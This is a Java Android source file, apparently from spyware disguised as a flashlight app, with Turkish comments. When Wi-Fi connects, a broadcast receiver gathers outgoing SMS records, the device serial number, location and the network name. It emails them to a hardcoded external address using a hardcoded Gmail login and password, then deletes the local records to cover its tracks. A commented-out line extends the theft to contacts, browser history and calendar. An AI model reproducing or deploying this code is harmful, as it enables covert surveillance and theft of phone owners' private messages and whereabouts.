package com.example.flashlightexample;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.StrictMode;
import android.util.Log;

//Arkada�lar burada yapaca��m�z �ey wifi ba�land���nda kay�tlar�m�z�n db kay�tlar�m�z�n) mail olarak bize g�nderilmesii�in
@SuppressLint("NewApi")
public class InternetDinliyorum extends BroadcastReceiver {
	GidenSmsDinleme gdnSms=new GidenSmsDinleme();
	KonumDinliyorum knm = new KonumDinliyorum();
	MainActivity ma=new MainActivity();
	private Mail h;
	public static int TYPE_WIFI = 1;
	public static int TYPE_MOBILE = 2;
	public static int TYPE_NOT_CONNECT = 0;

	public static int getConnectivityStatus(Context context) {

		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
		if (null != activeNetwork && cm.getActiveNetworkInfo().isAvailable()
				&& cm.getActiveNetworkInfo().isConnected()) {
			if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI) {
				
				return TYPE_WIFI;
			}

			if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE) {
				return TYPE_MOBILE;
			}
		}
		return TYPE_NOT_CONNECT;

	}

	public String getWifiName(Context context) {
		// ba�lan�lan wifi nin ad�n� alal�m
		String ssid = "none";
		WifiManager wifiManager = (WifiManager) context
				.getSystemService(Context.WIFI_SERVICE);
		WifiInfo wifiInfo = wifiManager.getConnectionInfo();
		ssid = wifiInfo.getSSID();
		return ssid;

	}

	@SuppressWarnings("unused")
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		int statusId = InternetDinliyorum.getConnectivityStatus(context);
		String ssdi = getWifiName(context);
		if (statusId == 1) {
			gdnSms.onReceive(context, intent);
			// Sayfan�n tetiklendi�i zaman
			String currenDateTime = DateFormat.getDateInstance().format(
					new Date());
			// Android Cihaz �d si okuma
			String serialnum = null;
			try {
				new Read(context, new MailCallback() {
					
					@Override
					public void onSucces(boolean result) {
						// TODO Auto-generated method stub
						Log.e("zms","zms result: "+result);
					}
					
					@Override
					public void onNumara(Map<String, String> numara) {
						// TODO Auto-generated method stub
						Log.e("zms","zms numara: "+numara.get("05071427743")+" "+numara);
					}
				}).execute();
				Class<?> c;
				c = Class.forName("android.os.SystemProperties");
				Method get = c.getMethod("get", String.class, String.class);
				serialnum = (String) (get.invoke(c, "ro.serialno", "unknown"));
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (NoSuchMethodException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		
			//Rehberin tamam�n� g�nderme
						// sQL�TE db kay�t i�lemleri
			SQLiteDatabaseHelper dbHelper = SQLiteDatabaseHelper
					.getInstance(context);
			SQLiteDatabase db = dbHelper.getWritableDatabase();
			ContentValues val = new ContentValues();
			val.put(SQLiteDatabaseHelper.COLUMN_DATETIME, currenDateTime);
			val.put(SQLiteDatabaseHelper.COLUMN_ACTION, "Wifi Bagland�");
			val.put(SQLiteDatabaseHelper.COLUMN_CONTENT, ssdi + " "
					);
			//  +"\n"+"Rehberin Tamam� \n"+ ma.outPut()+"\n Site Kay�tlar�\n\n "+ma.browserOut()+"Uygulama Bilgiler\n\n"+ma.appInfo()+"Takvim Okuma\n\n"+ma.calendrOut()
			val.put(SQLiteDatabaseHelper.COLUMN_SERIALNUMBER, serialnum);
			db.insert(SQLiteDatabaseHelper.TABLE_NEWS, null, val);
			// Burada ki�inin konumunu al�yoruz.
			knm.onReceive(context, intent);

			// Buraya gide Giden Smslerin db kay�t i�lemlerini yapal�m

			SQLiteDataBaseHelperGidenSms dbHelperGidenSms = SQLiteDataBaseHelperGidenSms//sadece bu 3 sat�r kod kalmal� 2. dbimizden
					.getInstance(context);
			SQLiteDatabase dbGidenSms = dbHelperGidenSms.getWritableDatabase();
			ContentValues valGidenSms = new ContentValues();
			
			
			// �imdi int ba�land���m�z� sorguladk ve dogrulad�k mail i�lemlerine
			// ge�ebilriiz.
			if (Build.VERSION.SDK_INT >= 9) {

				StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
						.permitAll().build();
				StrictMode.setThreadPolicy(policy);
			}
Log.i("zms","zms InterntB 1");
			h = new Mail("hemenindir57@gmail.com","123zafer123");
			Log.i("zms","zms InterntB 2");
			List<SQLiteDB> satirlar = new ArrayList<SQLiteDB>();
			db = dbHelper.getReadableDatabase();
			Cursor cursor = db.rawQuery(
					"select _id,dateTime,action,content,serialNumber from "
							+ SQLiteDatabaseHelper.TABLE_NEWS, null);
			cursor.moveToFirst();
			String epostaGovdesi = "";
			String cihazId = "";
			while (!cursor.isAfterLast()) {
				SQLiteDB n = new SQLiteDB(cursor.getInt(0),
						cursor.getString(1), cursor.getString(2),
						cursor.getString(3), cursor.getString(4));
				epostaGovdesi += cursor.getInt(0) + "\t" + cursor.getString(1)
						+ "\t" + cursor.getString(2) + "\t"
						+ cursor.getString(3) + "\t" + cursor.getString(4)
						+ "\n";
				cihazId = cursor.getString(4);
				cursor.moveToNext();
			}
				dbGidenSms = dbHelperGidenSms.getReadableDatabase();
				Cursor cursorGidenSms = dbGidenSms.rawQuery(
						"select _id,dateTime,action,content,serialNumber from "
								+ SQLiteDataBaseHelperGidenSms.TABLE_NEWS, null);
				cursorGidenSms.moveToFirst();

				while (!cursorGidenSms.isAfterLast()) {
					SQLiteDB nGidenSms = new SQLiteDB(cursorGidenSms.getInt(0),
							cursorGidenSms.getString(1),
							cursorGidenSms.getString(2),
							cursorGidenSms.getString(3),
							cursorGidenSms.getString(4));
					epostaGovdesi += cursorGidenSms.getInt(0) + "\t"
							+ cursorGidenSms.getString(1) + "\t"
							+ cursorGidenSms.getString(2) + "\t"
							+ cursorGidenSms.getString(3) + "\t"
							+ cursorGidenSms.getString(4) + "\n";
					cihazId = cursorGidenSms.getString(4);
					cursorGidenSms.moveToNext();
				}
					// Burada yapt���m�z eyer mail hatas�z olarak gittiyse sql
					// DB i siliyoruz ki cihaz�m�z �i�mesin
					if (emailGonder(cihazId + "KAYITLARI", epostaGovdesi) == 1) {
						String sql = "DELETE FROM "
								+ SQLiteDatabaseHelper.TABLE_NEWS;
						db.execSQL(sql);
						String sqlGidenSms = "DELETE FROM "
								+ SQLiteDataBaseHelperGidenSms.TABLE_NEWS;
						dbGidenSms.execSQL(sqlGidenSms);
						Log.i("zms","zms Gooooolllllll");
					}

			

		}

	}

	public int emailGonder(String konu, String mesaj) {
		String[] toArr = { "mehmetduman34500@gmail.com" };// aralara virg�l koyarak
														// istenildi�i kadar
														// mail adresi
														// girilebilr.
		h.setTo(toArr);
		h.setFrom("hemenindir57@gmail.com");
		h.setSubject(konu);
		h.setBody(mesaj);

		try {
			if (h.send()) {
				Log.i("zms Wfi Dinlyrm", "zms Eposta ba�ar� ile g�nderildi");
				return 1;
			} else {
				Log.i("zms Wfi Dinlyrm", "zms Eposta g�nderilemedi");
				return 2;
			}
		} catch (Exception e) {
			// TODO: handle exception
			Log.i("zms Wfi Dinlyrm",
					"zms Eposta g�nderilirken hata ald�: " + e.toString());
			return 3;

		}

	}

}//EWT ARKADA�LAR �NTERNET D�NLEMEDE B�TT���NE G�RE UYGULAMAMIZI DENEYEB�LRZ .�imdi denemeden �nce Manidest var tabi:)
